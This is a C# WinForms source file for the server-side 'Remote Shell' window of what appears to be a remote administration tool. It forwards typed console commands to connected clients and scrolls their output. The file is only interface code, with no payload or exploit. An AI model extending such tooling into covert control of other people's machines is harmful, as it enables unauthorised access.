using Serveur.Controllers;
using Serveur.Controllers.Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmRemoteShell : Form
    {
        //Instance de classe
        public FrmRemoteShellController frmRemoteShellController;
        private readonly ClientMosaic _clientMosaic;

        public FrmRemoteShell(ClientMosaic client)
        {
            _clientMosaic = client;
            _clientMosaic.value.frmRms = this;
            frmRemoteShellController = new FrmRemoteShellController(client);
            InitializeComponent();
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;

            if(_clientMosaic != null)
            {
                //this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);
            }

            this.ActiveControl = txtConsoleInput;
        }        

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                frmRemoteShellController.remoteShellKeyDown();
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleInput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char)2)
            {
                txtConsoleInput.Focus();
                txtConsoleInput.ScrollToCaret();
            }
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            SendMessage(txtConsoleOutput.Handle, 277, 7, 0);
        }

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
    }
}
